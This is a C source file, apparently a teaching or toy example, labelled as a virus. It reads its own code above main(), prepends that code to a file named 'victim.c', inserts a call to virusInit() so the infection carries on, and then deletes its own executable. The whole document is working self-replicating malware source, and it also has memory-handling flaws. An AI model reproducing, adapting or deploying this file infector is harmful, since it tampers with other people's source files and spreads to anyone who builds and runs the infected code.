#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <stdbool.h>
// Searches for a victim to copy the virus into
const char *fileSearch()
{
    char *fileName = "victim.c";
    return fileName;
}

void replicateVirus(char *content)
{
    long contentSize = strlen(content) + 1;

    // Opening up victim in read and write mode
    const char *victimFile = fileSearch();
    FILE *fp = fopen(victimFile, "r+");
    if (fp == NULL)
    {
        fprintf(stderr, "Error opening the file");
        exit(0);
    }

    // Determining the size of victim
    struct stat sb;
    stat(victimFile, &sb);
    long fileSize = sb.st_size;
    char *buffer = malloc(fileSize);

    long combinedSize = contentSize + fileSize;
    // For the content of the victim
    char *victimContent = malloc(fileSize + 16);
    strcpy(victimContent, "");
    if (victimContent == NULL)
    {
        fprintf(stderr, "Memory not allocated\n");
        exit(0);
    }

    // It contains the combined content to be copied
    char copyContent[combinedSize + 1];

    // Creating the content to be copied
    strcpy(copyContent, content);

    while (fscanf(fp, "%[^\n] ", buffer) != EOF)
    {
        const char *intmainString = "int main(";
        if (strlen(buffer) >= 9)
        {
            int i;
            for (i = 0; i < 9; i++)
            {
                if (buffer[i] != intmainString[i])
                {
                    break;
                }
            }
            if (i == 9)
            {
                strcat(buffer, "\n");
                strcat(victimContent, buffer);
                fscanf(fp, "%[^\n] ", buffer);
                strcat(victimContent,buffer);
                strcat(victimContent,"virusInit();\n");
                continue;
            }
        }
        strcat(buffer, "\n");
        strcat(victimContent, buffer);
    }

    strcat(copyContent, victimContent);

    /* Setting the file pointer to the beginning to paste the copyContent to the beginning of the victim */
    fseek(fp, 0, SEEK_SET);
    fprintf(fp, "%s", copyContent);

    /*Releasing the space occupied in heap*/
    fclose(fp);
    free(victimContent);
    free(buffer);
}

void virusInit()
{
    FILE *fp;
    // Opening up the current file(i.e. virus)
    fp = fopen(__FILE__, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Error opening the file");
        exit(0);
    }
    // Determining the size of virus
    struct stat sb;
    stat(__FILE__, &sb);
    char *buffer = malloc(sb.st_size);
    char *virusContent = malloc(sb.st_size);
    strcpy(virusContent, "");

    bool includePass = true;
    while (fscanf(fp, "%[^\n] ", buffer) != EOF)
    {
        const char *inc = "#include";
        const char *intmainString = "int main(";

        if (strlen(buffer) >= 9)
        {
            int i;
            for (i = 0; i < 9; i++)
            {
                if (buffer[i] != intmainString[i])
                {
                    break;
                }
            }
            if (i == 9)
            {
                break;
            }
        }
        strcat(buffer, "\n");
        strcat(virusContent, buffer);
    }

    // Replicating the virus to victim
    replicateVirus(virusContent);

    fclose(fp);
    free(buffer);
    free(virusContent);
}
int main(int c, char *argv[])
{
    // Initiating the virus
    virusInit();

    // Virus gets removed after infecting the victim
    remove(argv[0]);
    return 0;
}